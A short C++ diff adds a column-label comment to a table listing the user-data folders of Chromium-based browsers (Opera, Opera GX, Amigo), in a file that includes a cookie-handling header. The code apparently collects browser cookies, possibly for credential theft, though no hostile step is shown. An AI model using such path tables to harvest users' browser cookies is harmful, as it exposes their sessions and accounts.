@@ -12,6 +12,7 @@
 #include "impl/CCookies.h"
 
 static const std::vector<std::pair<std::pair<std::string, bool>, fs::path>> CHROMIUM_BROWSERS = {
+//  BROWSER NAME, HAS A PROFILES SYSTEM,    PATH TO DATA
     {{"Opera", false},      Utils::getRoamingPath() / "Opera Software"       / "Opera Stable"               },
     {{"Opera GX", false},   Utils::getRoamingPath() / "Opera Software"       / "Opera GX Stable"            },
     {{"Amigo",true},        Utils::getLocalPath()   / "Amigo"                / "User Data"                  },
